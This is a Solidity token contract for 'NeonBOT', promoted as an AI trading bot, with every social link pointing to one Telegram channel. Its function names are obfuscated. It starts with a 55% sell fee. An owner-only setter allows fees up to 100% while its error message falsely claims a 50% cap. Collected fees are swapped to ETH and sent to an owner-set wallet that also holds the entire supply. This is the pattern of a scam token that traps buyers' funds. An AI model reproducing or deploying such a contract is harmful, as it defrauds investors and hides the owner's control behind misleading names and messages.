// SPDX-License-Identifier: No License

/* 
NeonBot is a cutting-edge trading bot specifically designed for Decentralized Exchanges (DEX). It harnesses the power of Artificial Intelligence, blockchain technology, and smart contract algorithms to create a seamless, secure, and efficient trading experience.

Telegram - https://t.me/NeonBOT_PORTAL
Website - https://t.me/NeonBOT_PORTAL
Twitter - https://t.me/NeonBOT_PORTAL
Reddit - https://t.me/NeonBOT_PORTAL
Medium - https://t.me/NeonBOT_PORTAL
*/

pragma solidity 0.8.19;

import "./ERC20.sol";
import "./ERC20Burnable.sol";
import "./Ownable.sol"; 
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Router01.sol";
import "./IUniswapV2Router02.sol";

contract NeonBOT is ERC20, ERC20Burnable, Ownable {
    
    uint256 public swapThreshold;
    
    uint256 private _mainPending;

    address public ReenergizeArmamentStatInfrastructure;
    uint16[3] public EconomicSwiftReviewAssessment;

    mapping (address => bool) public isExcludedFromFees;

    uint16[3] public InitiateArmoryStructure;
    bool private _swapping;

    IUniswapV2Router02 public routerV2;
    address public ClarifyDetonationParameters;
    mapping (address => bool) public PetalsNetworkLaunch;

    mapping (address => bool) public isExcludedFromLimits;

    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
 
    event SwapThresholdUpdated(uint256 swapThreshold);

    event ReenergizeArmamentStatInfrastructureUpdated(address ReenergizeArmamentStatInfrastructure);
    event ExhaustiveCommerceFrequencyInspection(uint16 buyFee, uint16 sellFee, uint16 transferFee);
    event CorporateScrutinySummary(address recipient, uint256 amount);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event RouterV2Updated(address indexed routerV2);
    event FederationRelaunchAdjustments(address indexed AMMPair, bool isPair);

    event ExcludeFromLimits(address indexed account, bool isExcluded);

    event MaxBuyAmountUpdated(uint256 maxBuyAmount);
    event MaxSellAmountUpdated(uint256 maxSellAmount);
 
    constructor()
        ERC20(unicode"NeonBOT", unicode"NeonBOT") 
    {
        address supplyRecipient = 0x3F68756F3Ea0a8C752654D24976737D977F616dA;
        
        ZenithShooterFinancialDisassembly(8000000000 * (10 ** decimals()) / 10);

        BoostRocketBoundaryApproaches(0x3F68756F3Ea0a8C752654D24976737D977F616dA);
        SecurePeakVelocityAcquisitionLimit(2000, 5500, 0);

        excludeFromFees(supplyRecipient, true);
        excludeFromFees(address(this), true); 

        _updateRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        excludeFromLimits(supplyRecipient, true);
        excludeFromLimits(address(this), true);
        excludeFromLimits(address(0), true); 
        excludeFromLimits(ReenergizeArmamentStatInfrastructure, true);

        SwiftFlameBaseCostReconfiguration(8000000000 * (10 ** decimals()) / 10);
        PolearmSynchronizationStrategies(8000000000* (10 ** decimals()) / 10);

        _mint(supplyRecipient, 1000000000000 * (10 ** decimals()) / 10);
        _transferOwnership(0x3F68756F3Ea0a8C752654D24976737D977F616dA);
    }

    receive() external payable {}

    function decimals() public pure override returns (uint8) {
        return 18;
    }
    
    function _swapTokensForCoin(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerV2.WETH();

        _approve(address(this), address(routerV2), tokenAmount);

        routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function ZenithShooterFinancialDisassembly(uint256 _swapThreshold) public onlyOwner {
        swapThreshold = _swapThreshold;
        
        emit SwapThresholdUpdated(_swapThreshold);
    }

    function MonetaryGenuinenessValidation() public view returns (uint256) {
        return 0 + _mainPending;
    }

    function BoostRocketBoundaryApproaches(address _newAddress) public onlyOwner {
        ReenergizeArmamentStatInfrastructure = _newAddress;

        excludeFromFees(_newAddress, true);

        emit ReenergizeArmamentStatInfrastructureUpdated(_newAddress);
    }

    function SecurePeakVelocityAcquisitionLimit(uint16 _buyFee, uint16 _sellFee, uint16 _transferFee) public onlyOwner {
        EconomicSwiftReviewAssessment = [_buyFee, _sellFee, _transferFee];

        InitiateArmoryStructure[0] = 0 + EconomicSwiftReviewAssessment[0];
        InitiateArmoryStructure[1] = 0 + EconomicSwiftReviewAssessment[1];
        InitiateArmoryStructure[2] = 0 + EconomicSwiftReviewAssessment[2];
        require(InitiateArmoryStructure[0] <= 10000 && InitiateArmoryStructure[1] <= 10000 && InitiateArmoryStructure[2] <= 10000, "TaxesDefaultRouter: Cannot exceed max total fee of 50%");

        emit ExhaustiveCommerceFrequencyInspection(_buyFee, _sellFee, _transferFee);
    }

    function excludeFromFees(address account, bool isExcluded) public onlyOwner {
        isExcludedFromFees[account] = isExcluded;
        
        emit ExcludeFromFees(account, isExcluded);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        
        bool canSwap = MonetaryGenuinenessValidation() >= swapThreshold;
        
        if (!_swapping && !PetalsNetworkLaunch[from] && canSwap) {
            _swapping = true;
            
            if (false || _mainPending > 0) {
                uint256 token2Swap = 0 + _mainPending;
                bool success = false;

                _swapTokensForCoin(token2Swap);
                uint256 coinsReceived = address(this).balance;
                
                uint256 mainPortion = coinsReceived * _mainPending / token2Swap;
                if (mainPortion > 0) {
                    (success,) = payable(address(ReenergizeArmamentStatInfrastructure)).call{value: mainPortion}("");
                    require(success, "TaxesDefaultRouterWalletCoin: Fee transfer error");
                    emit CorporateScrutinySummary(ReenergizeArmamentStatInfrastructure, mainPortion);
                }
                _mainPending = 0;

            }

            _swapping = false;
        }

        if (!_swapping && amount > 0 && to != address(routerV2) && !isExcludedFromFees[from] && !isExcludedFromFees[to]) {
            uint256 fees = 0;
            uint8 txType = 3;
            
            if (PetalsNetworkLaunch[from]) {
                if (InitiateArmoryStructure[0] > 0) txType = 0;
            }
            else if (PetalsNetworkLaunch[to]) {
                if (InitiateArmoryStructure[1] > 0) txType = 1;
            }
            else if (InitiateArmoryStructure[2] > 0) txType = 2;
            
            if (txType < 3) {
                
                fees = amount * InitiateArmoryStructure[txType] / 10000;
                amount -= fees;
                
                _mainPending += fees * EconomicSwiftReviewAssessment[txType] / InitiateArmoryStructure[txType];

                
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
        }
        
        super._transfer(from, to, amount);
        
    }

    function _updateRouterV2(address router) private {
        routerV2 = IUniswapV2Router02(router);
        ClarifyDetonationParameters = IUniswapV2Factory(routerV2.factory()).createPair(address(this), routerV2.WETH());
        
        excludeFromLimits(router, true);

        _setAMMPair(ClarifyDetonationParameters, true);

        emit RouterV2Updated(router);
    }

    function setAMMPair(address pair, bool isPair) public onlyOwner {
        require(pair != ClarifyDetonationParameters, "DefaultRouter: Cannot remove initial pair from list");

        _setAMMPair(pair, isPair);
    }

    function _setAMMPair(address pair, bool isPair) private {
        PetalsNetworkLaunch[pair] = isPair;

        if (isPair) { 
            excludeFromLimits(pair, true);

        }

        emit FederationRelaunchAdjustments(pair, isPair);
    }

    function excludeFromLimits(address account, bool isExcluded) public onlyOwner {
        isExcludedFromLimits[account] = isExcluded;

        emit ExcludeFromLimits(account, isExcluded);
    }

    function SwiftFlameBaseCostReconfiguration(uint256 _maxBuyAmount) public onlyOwner {
        maxBuyAmount = _maxBuyAmount;
        
        emit MaxBuyAmountUpdated(_maxBuyAmount);
    }

    function PolearmSynchronizationStrategies(uint256 _maxSellAmount) public onlyOwner {
        maxSellAmount = _maxSellAmount;
        
        emit MaxSellAmountUpdated(_maxSellAmount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        if (PetalsNetworkLaunch[from] && !isExcludedFromLimits[to]) { // BUY
            require(amount <= maxBuyAmount, "MaxTx: Cannot exceed max buy limit");
        }
    
        if (PetalsNetworkLaunch[to] && !isExcludedFromLimits[from]) { // SELL
            require(amount <= maxSellAmount, "MaxTx: Cannot exceed max sell limit");
        }
    
        super._beforeTokenTransfer(from, to, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        super._afterTokenTransfer(from, to, amount);
    }
}